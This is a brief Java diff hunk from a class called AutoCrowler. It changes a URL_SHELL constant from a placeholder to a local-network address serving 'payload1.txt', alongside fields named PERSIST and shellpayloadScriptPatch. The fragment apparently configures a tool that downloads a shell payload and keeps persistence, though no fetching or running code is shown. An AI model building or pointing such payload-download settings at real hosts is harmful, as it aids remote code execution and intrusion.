@@ -11,7 +11,7 @@ public class AutoCrowler {
 	public static String tmpFileCreated = "";
 	public static boolean PERSIST = true;
 	public static String shellpayloadScriptPatch = "";
-	public static final String URL_SHELL = "http://xxx.xxx.xxx.xxx/payload.txt";
+	public static final String URL_SHELL = "http://192.168.0.101/payload1.txt";
 
 	public static void main(String[] args) {
 		try {
